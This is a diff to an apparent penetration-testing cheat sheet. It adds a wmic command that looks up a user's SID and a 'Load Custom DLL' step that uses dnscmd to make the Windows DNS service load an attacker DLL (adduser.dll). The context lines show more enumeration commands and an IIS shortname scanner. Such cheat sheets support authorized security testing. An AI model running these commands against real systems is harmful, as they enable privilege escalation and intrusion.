@@ -233,6 +233,7 @@ C:\> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /form
 C:\> wmic process list /format:list
 C:\> wmic ntdomain list /format:list
 C:\> wmic useraccount list /format:list
+C:\> wmic useraccount where name="<username>" get sid
 C:\> wmic group list /format:list
 C:\> wmic sysaccount list /format:list
 C:\> wmic product get name
@@ -1169,6 +1170,12 @@ http://<IP address>:8500/CFIDE/administrator
 ```
 https://github.com/irsdl/IIS-ShortName-Scanner
 $ java -jar iis_shortname_scanner.jar 0 5 http://<IP addresss>/
+```
+
+- Load Custom DLL
+
+```
+C:\> dnscmd.exe /config /serverlevelplugindll adduser.dll
 ```
 
 #4. - Lateral Movement
